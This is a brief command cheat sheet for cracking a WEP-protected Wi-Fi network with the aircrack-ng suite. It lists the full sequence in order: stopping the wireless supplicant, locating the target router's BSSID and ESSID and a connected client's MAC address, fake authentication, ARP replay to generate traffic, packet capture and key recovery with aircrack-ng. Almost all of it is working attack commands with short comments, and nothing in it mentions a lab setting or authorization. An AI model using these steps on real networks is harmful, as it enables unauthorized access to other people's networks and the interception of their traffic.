emerge aircrack-ng
killall wpa_supplicant
killall wpa_cli

 aireplay-ng -9 wlan0

 #use wireshark to know network space IP range , if it is not known
  
#determine bssid (mac address) and essid (wifi name) of router, and mac address of any client device connected to router from the below command, in the upper section we can see router details and lower section #we can see client devices detail

  airodump-ng wlan0

##below message should successful message otherwise try next command by lowering the rate
aireplay-ng wlan0 --fakeauth 0 -e <apssid> -a <apmacaddr> -h <clientmacaddr>

iwconfig wlan0 rate 1M

##get more traffic of packets, other wise start apache2 on any machine and try to stream on any device connected to that or browse internet
 aireplay-ng wlan0 --arpreplay -b <apmacaddr> -h <clientmacaddr>

 #capture data and output it to a file for later analysis, give fullpath
 airodump-ng wlan0 -w <outputfile> --channel <apchannel> --bssid <apmacaddr>

#Finally execute the command to see the wep password!
 aircrack-ng -z <outputfile>.cap